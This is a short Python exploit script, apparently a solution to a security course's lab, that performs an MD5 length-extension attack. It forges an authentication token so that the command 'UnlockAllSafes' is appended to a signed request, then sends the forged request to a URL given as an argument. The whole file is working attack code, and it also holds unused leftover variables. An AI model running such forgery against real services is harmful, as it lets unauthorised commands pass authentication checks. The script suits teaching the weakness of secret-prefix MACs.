#!/usr/bin/python3
import http.client as httplib
from urllib.parse import urlparse, quote
import sys, re
from pymd5 import *
url = sys.argv[1]


m ='12345678' +  'user=admin&command1=ListFiles&command2=NoOp'
padded_m_len =(len(m)  + len(padding((len(m)) * 8)))*8
h2 = md5(
        state = "402a574d265dc212ee64970f159575d0",
        count = padded_m_len

    )
command  = '&command3=UnlockAllSafes'
h2.update(command)
parsedUrl = urlparse(url)
q = 'token='+h2.hexdigest()+'&user=admin&command1=ListFiles&command2=NoOp'+ quote(padding(len(m)*8))+'&command3=UnlockAllSafes'
z = len(padding(len(m)) * 8)
y = len(m)
l = "&command#=UnlockAllSafes"
conn = httplib.HTTPConnection(parsedUrl.hostname,parsedUrl.port)
conn.request("GET", parsedUrl.path + "?" + q)
print(conn.getresponse().read())
